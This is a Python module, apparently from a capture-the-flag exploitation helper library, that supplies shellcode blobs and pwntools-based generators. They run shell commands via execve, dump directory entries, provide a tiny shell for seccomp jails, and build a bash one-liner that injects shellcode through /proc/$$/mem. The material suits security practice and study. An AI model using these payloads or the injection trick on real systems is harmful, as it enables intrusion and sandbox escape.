"""doglib.shellcode -- Shellcode blobs and generators for common architectures.

Blobs are :class:`~doglib.shellcode._base.ShellcodeSet` instances loaded from
``doglib/data/shellcode/<name>/``, one file per arch named after the pwntools
arch string (e.g. ``amd64``, ``i386``, ``arm``)::

    from doglib.shellcode import minshell

    payload = minshell.amd64          # raw bytes, explicit arch
    payload = minshell.for_context()  # uses pwntools context.arch
    print(minshell.arches)            # ['aarch64', 'amd64', 'arm', ...]

Generators are plain functions that produce bytes at runtime::

    from doglib.shellcode import runcmd

    payload = runcmd("ls -la")

Adding a new blob set
---------------------
1. Place arch-named files under ``src/doglib/data/shellcode/<name>/``.
2. Add ``<name> = ShellcodeSet("<name>")`` below and update ``__all__``.
"""
from contextlib import contextmanager

from doglib.shellcode._base import ShellcodeSet
import pwnlib.shellcraft as _shcraft
from pwnlib.asm import asm as _asm
from pwnlib.context import context as _context
from base64 import b64encode
from gzip import compress as gzcompress

@contextmanager
def _sc(ctx: str | None = None):
    """Set pwntools arch context and yield the matching shellcraft module."""
    arch = ctx or _context.arch
    with _context.local(arch=arch, **_context.architectures[arch]):
        yield getattr(_shcraft, arch)

# ---------------------------------------------------------------------------
# Blobs
# ---------------------------------------------------------------------------
"""
shellcode for tiny shell, useful for seccomp jails
- cat: read files
- ls: list files
- cd: change directory
- exit: quit
- anything else is treated as a command to execute
    - type 'tg' to use execveat() over execve()
"""
minshell = ShellcodeSet("minshell")

# ---------------------------------------------------------------------------
# Generators
# ---------------------------------------------------------------------------

# run a shell command
def runcmd(cmd: str, ctx: str | None = None) -> bytes:
    with _sc(ctx) as sc:
        return _asm(sc.linux.execve("/bin/sh", ["/bin/sh", "-c", cmd], 0))

# lazy directory reading, just dump the raw dirent structs to stdout
# you can parse this output with pwnlib.util.dirents
def listdir(path: str, size: int = 0x1000, ctx: str | None = None) -> bytes:
    with _sc(ctx) as sc:
        code  = sc.linux.open(path, 'O_RDONLY|O_DIRECTORY')
        code += f"sub rsp, {size:#x}\n"
        code += sc.linux.syscall('SYS_getdents', 'rax', 'rsp', size)
        code += sc.linux.syscall('SYS_write', 1, 'rsp', 'rax')
        code += f"add rsp, {size:#x}\n"
        return _asm(code)

# bash oneliner to inject shellcode into current process
# from https://github.com/nobodyisnobody/docs/tree/main/linux.tricks/Bash.shellcode.injection.oneliner
# shell will probably crash after, so you should wrap this in /bin/bash -c ''
def bash_shellcode(asm: bytes, compress: bool = False) -> str:
    if compress:
        asm = gzcompress(asm)
    payload = b64encode(asm).decode()
    return f"cd /proc/$$;read a<syscall;exec 3>mem;echo {payload}|base64 -d{'|gunzip' if compress else ''}|dd bs=1 seek=$[`echo $a|cut -d\" \" -f9`-2]>&3;read k"

# ---------------------------------------------------------------------------



__all__ = ["minshell", "runcmd", "listdir", "bash_shellcode"]
